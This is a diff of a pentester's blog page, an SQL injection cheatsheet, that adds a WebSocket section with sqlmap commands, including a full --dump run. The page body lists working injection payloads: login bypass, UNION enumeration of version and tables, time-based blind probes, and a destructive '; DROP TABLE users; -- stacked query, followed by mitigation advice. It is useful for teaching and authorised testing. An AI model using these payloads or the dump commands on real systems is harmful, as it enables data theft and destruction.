@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
@@ -9,16 +9,16 @@
 <meta name="keywords" content="sql-injection, web-security, cheatsheet">
 <meta name="description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.">
 <meta name="author" content="realspaceeagle">
-<link rel="canonical" href="http://localhost:1313/cheatsheets/sql-injection/">
+<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/sql-injection/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.svg">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon.svg">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon.svg">
-<link rel="apple-touch-icon" href="http://localhost:1313/favicon.svg">
-<link rel="mask-icon" href="http://localhost:1313/favicon.svg">
+<link rel="icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="apple-touch-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="mask-icon" href="https://realspaceeagle.github.io/favicon.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/cheatsheets/sql-injection/">
+<link rel="alternate" hreflang="en" href="https://realspaceeagle.github.io/cheatsheets/sql-injection/">
 <noscript>
     <style>
         #theme-toggle,
@@ -64,15 +64,15 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 
-<link rel="canonical" href="http://localhost:1313/cheatsheets/sql-injection/">
+<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/sql-injection/">
 
 
 <meta property="og:title" content="SQL Injection Cheatsheet - realspaceeagle">
 <meta property="og:description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.">
-<meta property="og:url" content="http://localhost:1313/cheatsheets/sql-injection/">
+<meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/sql-injection/">
 <meta property="og:site_name" content="realspaceeagle">
 <meta property="og:locale" content="en_US"><meta property="og:type" content="article">
-<meta property="article:author" content="realspaceeagle"><meta property="article:published_time" content="2024-01-01T00:00:00Z"><meta property="article:modified_time" content="2024-01-01T00:00:00Z"><meta property="article:tag" content="sql-injection"><meta property="article:tag" content="web-security"><meta property="article:tag" content="cheatsheet"><meta property="article:section" content="cheatsheets"><meta property="og:image" content="http://localhost:1313/images/og-image.svg">
+<meta property="article:author" content="realspaceeagle"><meta property="article:published_time" content="2024-01-01T00:00:00Z"><meta property="article:modified_time" content="2024-01-01T00:00:00Z"><meta property="article:tag" content="sql-injection"><meta property="article:tag" content="web-security"><meta property="article:tag" content="cheatsheet"><meta property="article:section" content="cheatsheets"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
   <meta property="og:image:alt" content="realspaceeagle">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
@@ -80,9 +80,9 @@
 <meta name="twitter:site" content="@haran_loga">
 <meta name="twitter:creator" content="@haran_loga">
 <meta name="twitter:title" content="SQL Injection Cheatsheet - realspaceeagle">
-<meta name="twitter:description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities."><meta name="twitter:image" content="http://localhost:1313/images/og-image.svg">
+<meta name="twitter:description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities."><meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
   <meta name="twitter:image:alt" content="realspaceeagle"><meta name="article:author" content="realspaceeagle">
-<meta name="article:publisher" content="http://localhost:1313/"><meta name="news_keywords" content="sql-injection, web-security, cheatsheet">
+<meta name="article:publisher" content="https://realspaceeagle.github.io/"><meta name="news_keywords" content="sql-injection, web-security, cheatsheet">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org","@type": "BlogPosting",
@@ -93,26 +93,26 @@
     "name": "realspaceeagle",
     "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
     "description": "Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.",
-    "url": "http:\/\/localhost:1313\/"
+    "url": "https:\/\/realspaceeagle.github.io\/"
   },
   "publisher": {
     "@type": "Person",
     "name": "realspaceeagle",
     "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
-    "url": "http:\/\/localhost:1313\/"
+    "url": "https:\/\/realspaceeagle.github.io\/"
   },
-  "datePublished": "2024-01-01T00:00:00Z","dateModified": "2024-01-01T00:00:00Z","url": "http:\/\/localhost:1313\/cheatsheets\/sql-injection\/",
+  "datePublished": "2024-01-01T00:00:00Z","dateModified": "2024-01-01T00:00:00Z","url": "https:\/\/realspaceeagle.github.io\/cheatsheets\/sql-injection\/",
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "http:\/\/localhost:1313\/cheatsheets\/sql-injection\/"
+    "@id": "https:\/\/realspaceeagle.github.io\/cheatsheets\/sql-injection\/"
   },"image": {
     "@type": "ImageObject",
-    "url": "http:\/\/localhost:1313\/images\/og-image.svg",
+    "url": "https:\/\/realspaceeagle.github.io\/images\/og-image.svg",
     "width": 1200,
     "height": 630
   },"keywords": "sql-injection, web-security, cheatsheet",
   "articleSection": "cheatsheets",
-  "wordCount":  290 ,
+  "wordCount":  344 ,
   "genre": ["Cybersecurity", "Technology", "Education"],
   "about": [{
       "@type": "Thing",
@@ -135,17 +135,17 @@
       "@type": "ListItem",
       "position": 1,
       "name": "Home",
-      "item": "http:\/\/localhost:1313\/"
+      "item": "https:\/\/realspaceeagle.github.io\/"
     },{
       "@type": "ListItem",
       "position":  2 ,
       "name": "Cheatsheets",
-      "item": "http:\/\/localhost:1313\/categories\/cheatsheets\/"
+      "item": "https:\/\/realspaceeagle.github.io\/categories\/cheatsheets\/"
     },{
       "@type": "ListItem",
       "position":  3 ,
       "name": "SQL Injection Cheatsheet",
-      "item": "http:\/\/localhost:1313\/cheatsheets\/sql-injection\/"
+      "item": "https:\/\/realspaceeagle.github.io\/cheatsheets\/sql-injection\/"
     }]
 }
 </script>
@@ -229,7 +229,7 @@
           gtag('js', new Date());
           gtag('config', 'G-GPTRZ14YZS');
         }
-      </script><meta property="og:url" content="http://localhost:1313/cheatsheets/sql-injection/">
+      </script><meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/sql-injection/">
   <meta property="og:site_name" content="realspaceeagle">
   <meta property="og:title" content="SQL Injection Cheatsheet">
   <meta property="og:description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.">
@@ -241,9 +241,9 @@
     <meta property="article:tag" content="Sql-Injection">
     <meta property="article:tag" content="Web-Security">
     <meta property="article:tag" content="Cheatsheet">
-      <meta property="og:image" content="http://localhost:1313/images/og-image.svg">
+      <meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://localhost:1313/images/og-image.svg">
+<meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
 <meta name="twitter:title" content="SQL Injection Cheatsheet">
 <meta name="twitter:description" content="Payload patterns, testing workflow, and remediation guidance for SQL injection vulnerabilities.">
 
@@ -257,13 +257,13 @@
       "@type": "ListItem",
       "position":  1 ,
       "name": "Security Cheatsheets",
-      "item": "http://localhost:1313/cheatsheets/"
+      "item": "https://realspaceeagle.github.io/cheatsheets/"
     }, 
     {
       "@type": "ListItem",
       "position":  2 ,
       "name": "SQL Injection Cheatsheet",
-      "item": "http://localhost:1313/cheatsheets/sql-injection/"
+      "item": "https://realspaceeagle.github.io/cheatsheets/sql-injection/"
     }
   ]
 }
@@ -278,10 +278,10 @@
   "keywords": [
     "sql-injection", "web-security", "cheatsheet"
   ],
-  "articleBody": "SQL Injection Cheatsheet Test Workflow Identify entry points: parameters, headers, cookies, JSON bodies. Baseline request: repeat the request and capture the normal response for comparison. Break the query: start with a single quote ' or double quote \" to look for syntax errors. Confirm injection: use logic tests such as AND 1=1 (true) vs AND 1=2 (false). Escalate: move from time-based to union-based or stacked queries depending on DBMS. Quick Payloads ' OR '1'='1' -- \" OR \"1\"=\"1\" -- ') OR '1'='1' -- admin' -- admin' # Numeric Context 1 OR 1=1 1 UNION ALL SELECT NULL 1 ORDER BY 5-- Boolean Tests 1 AND 1=1 1 AND SLEEP(5) 1 AND (SELECT 1 FROM pg_sleep(5)) Union Enumeration Count columns: ORDER BY 1, ORDER BY 2, increment until error. Match types: UNION ALL SELECT NULL,NULL etc. Extract data: replace NULL with payloads like @@version, database(), or current_user. 1 UNION ALL SELECT @@version, user() 1 UNION ALL SELECT NULL, table_name FROM information_schema.tables Time-Based Enumeration 1 AND SLEEP(5) 1 AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='r') THEN SLEEP(5) ELSE 0 END) '; WAITFOR DELAY '0:0:5'-- Stacked Queries '; DROP TABLE users; -- '; INSERT INTO log_table(user, ts) VALUES ('tester', NOW()); -- Only available when the database driver supports multiple statements.\nDetection Cheatcodes Check Content-Length differences between responses. For blind cases, use time or response length changes. Monitor HTTP status codes (500 vs 200) during tests. DBMS Fingerprints Indicator Likely DBMS @@version, sysobjects SQL Server information_schema.tables MySQL/PostgreSQL DUAL, FROM dual Oracle sqlite_master SQLite Mitigation Reminders Parameterized queries or stored procedures only. Input validation and allow lists (do not rely on blacklist). Use least privilege DB accounts. Centralize error handling to avoid leaking stack traces. Always capture before/after evidence and coordinate fixes with developers and database administrators.\n",
-  "wordCount" : "290",
+  "articleBody": "SQL Injection Cheatsheet Test Workflow Identify entry points: parameters, headers, cookies, JSON bodies. Baseline request: repeat the request and capture the normal response for comparison. Break the query: start with a single quote ' or double quote \" to look for syntax errors. Confirm injection: use logic tests such as AND 1=1 (true) vs AND 1=2 (false). Escalate: move from time-based to union-based or stacked queries depending on DBMS. Quick Payloads ' OR '1'='1' -- \" OR \"1\"=\"1\" -- ') OR '1'='1' -- admin' -- admin' # Numeric Context 1 OR 1=1 1 UNION ALL SELECT NULL 1 ORDER BY 5-- Boolean Tests 1 AND 1=1 1 AND SLEEP(5) 1 AND (SELECT 1 FROM pg_sleep(5)) Union Enumeration Count columns: ORDER BY 1, ORDER BY 2, increment until error. Match types: UNION ALL SELECT NULL,NULL etc. Extract data: replace NULL with payloads like @@version, database(), or current_user. 1 UNION ALL SELECT @@version, user() 1 UNION ALL SELECT NULL, table_name FROM information_schema.tables Time-Based Enumeration 1 AND SLEEP(5) 1 AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='r') THEN SLEEP(5) ELSE 0 END) '; WAITFOR DELAY '0:0:5'-- Stacked Queries '; DROP TABLE users; -- '; INSERT INTO log_table(user, ts) VALUES ('tester', NOW()); -- Only available when the database driver supports multiple statements.\nDetection Cheatcodes Check Content-Length differences between responses. For blind cases, use time or response length changes. Monitor HTTP status codes (500 vs 200) during tests. DBMS Fingerprints Indicator Likely DBMS @@version, sysobjects SQL Server information_schema.tables MySQL/PostgreSQL DUAL, FROM dual Oracle sqlite_master SQLite WebSocket Automation Switch to a WebSocket-aware client when the application upgrades connections (e.g. wscat -c ws://host:port/ws). Boolean probes still work; wrap the JSON payload with logical operators such as {\"id\":\"92130 OR 5=1-- -\"}. sqlmap can drive WebSockets directly: sqlmap -u 'ws://target/ws' --data '{\"id\":\"*\"}' --batch sqlmap -u 'ws://target/ws' --data '{\"id\":\"*\"}' --level 5 --risk 3 --dump Mitigation Reminders Parameterized queries or stored procedures only. Input validation and allow lists (do not rely on blacklist). Use least privilege DB accounts. Centralize error handling to avoid leaking stack traces. Always capture before/after evidence and coordinate fixes with developers and database administrators.\n",
+  "wordCount" : "344",
   "inLanguage": "en",
-  "image": "http://localhost:1313/images/og-image.svg","datePublished": "2024-01-01T00:00:00Z",
+  "image": "https://realspaceeagle.github.io/images/og-image.svg","datePublished": "2024-01-01T00:00:00Z",
   "dateModified": "2024-01-01T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -289,14 +289,14 @@
   },
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "http://localhost:1313/cheatsheets/sql-injection/"
+    "@id": "https://realspaceeagle.github.io/cheatsheets/sql-injection/"
   },
   "publisher": {
     "@type": "Organization",
     "name": "realspaceeagle",
     "logo": {
       "@type": "ImageObject",
-      "url": "http://localhost:1313/favicon.svg"
+      "url": "https://realspaceeagle.github.io/favicon.svg"
     }
   }
 }
@@ -317,7 +317,7 @@
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
+            <a href="https://realspaceeagle.github.io/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
             
             
             <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu">
@@ -373,47 +373,47 @@
         
         <ul id="menu" class="desktop-menu">
             <li>
-                <a href="http://localhost:1313/" title="Home">
+                <a href="https://realspaceeagle.github.io/" title="Home">
                     <span>Home</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about/" title="About">
+                <a href="https://realspaceeagle.github.io/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/archives/" title="Archives">
+                <a href="https://realspaceeagle.github.io/archives/" title="Archives">
                     <span>Archives</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/cheatsheets/" title="Cheatsheets">
+                <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
                     <span>Cheatsheets</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://realspaceeagle.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags/" title="Tags">
+                <a href="https://realspaceeagle.github.io/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/categories/" title="Categories">
+                <a href="https://realspaceeagle.github.io/categories/" title="Categories">
                     <span>Categories</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/projects/" title="Projects">
+                <a href="https://realspaceeagle.github.io/projects/" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/contact/" title="Contact">
+                <a href="https://realspaceeagle.github.io/contact/" title="Contact">
                     <span>Contact</span>
                 </a>
             </li>
@@ -423,47 +423,47 @@
         <div id="mobile-menu" class="mobile-menu">
             <ul class="mobile-menu-list">
                 <li>
-                    <a href="http://localhost:1313/" title="Home">
+                    <a href="https://realspaceeagle.github.io/" title="Home">
                         <span>Home</span>
                     </a>
                 </li>
                 <li>
-                    <a href="http://localhost:1313/about/" title="About">
+                    <a href="https://realspaceeagle.github.io/about/" title="About">
                         <span>About</span>
                     </a>
                 </li>
                 <li>
-                    <a href="http://localhost:1313/archives/" title="Archives">
+                    <a href="https://realspaceeagle.github.io/archives/" title="Archives">
                         <span>Archives</span>
                     </a>
                 </li>
                 <li>
-                    <a href="http://localhost:1313/cheatsheets/" title="Cheatsheets">
+                    <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
                         <span>Cheatsheets</span>
                     </a>
                 </li>
                 <li>
-                    <a href="http://localhost:1313/search/" title="Search" accesskey=/>
+                    <a href="https://realspaceeagle.github.io/search/" title="Search" accesskey=/>
                         <span>Search</span>
                     </a>
                 </li>
                 <li>
-                    <a href="http://localhost:1313/tags/" title="Tags">
+                    <a href="https://realspaceeagle.github.io/tags/" title="Tags">
                         <span>Tags</span>
                     </a>
                 </li>
                 <li>
-                    <a href="http://localhost:1313/categories/" title="Categories">
+                    <a href="https://realspaceeagle.github.io/categories/" title="Categories">
                         <span>Categories</span>
                     </a>
                 </li>
                 <li>
-                    <a href="http://localhost:1313/projects/" title="Projects">
+                    <a href="https://realspaceeagle.github.io/projects/" title="Projects">
                         <span>Projects</span>
                     </a>
                 </li>
                 <li>
-                    <a href="http://localhost:1313/contact/" title="Contact">
+                    <a href="https://realspaceeagle.github.io/contact/" title="Contact">
                         <span>Contact</span>
                     </a>
                 </li>
@@ -612,7 +612,15 @@ document.addEventListener('DOMContentLoaded', function() {
       </tr>
   </tbody>
 </table>
-<h2 id="mitigation-reminders">Mitigation Reminders</h2>
+<h2 id="websocket-automation">WebSocket Automation</h2>
+<ul>
+<li>Switch to a WebSocket-aware client when the application upgrades connections (e.g. <code>wscat -c ws://host:port/ws</code>).</li>
+<li>Boolean probes still work; wrap the JSON payload with logical operators such as <code>{&quot;id&quot;:&quot;92130 OR 5=1-- -&quot;}</code>.</li>
+<li>sqlmap can drive WebSockets directly:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://target/ws&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --batch
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://target/ws&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --level <span class="m">5</span> --risk <span class="m">3</span> --dump
+</span></span></code></pre></div><h2 id="mitigation-reminders">Mitigation Reminders</h2>
 <ul>
 <li>Parameterized queries or stored procedures only.</li>
 <li>Input validation and allow lists (do not rely on blacklist).</li>
@@ -627,9 +635,9 @@ document.addEventListener('DOMContentLoaded', function() {
   <footer class="post-footer">
     <nav class="paginav">
       Tags:
-      <a class="tag" href="http://localhost:1313/tags/sql-injection/"># Sql-Injection</a>
-      <a class="tag" href="http://localhost:1313/tags/web-security/"># Web-Security</a>
-      <a class="tag" href="http://localhost:1313/tags/cheatsheet/"># Cheatsheet</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/sql-injection/"># Sql-Injection</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/web-security/"># Web-Security</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/cheatsheet/"># Cheatsheet</a>
     </nav>
   </footer>
 </article>
